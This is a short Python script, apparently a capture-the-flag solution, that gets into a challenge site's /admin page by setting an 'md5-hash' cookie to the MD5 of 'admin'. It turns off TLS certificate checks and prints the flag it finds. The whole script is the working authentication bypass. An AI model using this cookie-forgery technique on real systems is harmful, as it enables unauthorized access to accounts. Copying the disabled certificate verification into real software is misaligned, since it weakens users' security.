#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: john
# @Date:   2016-05-01 11:21:23
# @Last Modified by:   john
# @Last Modified time: 2016-05-01 11:26:35

import requests
import hashlib
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

username = 'admin'
md5 = hashlib.md5()
md5.update(username)
md5_hash = md5.hexdigest()

s = requests.Session()
s.cookies.update({'md5-hash':md5_hash})
r = s.get('https://ernst-echidna.ctfcompetition.com/admin', verify=False)
content = r.text

matched = re.search('CTF{.*}', content)
if matched:
	print matched.group()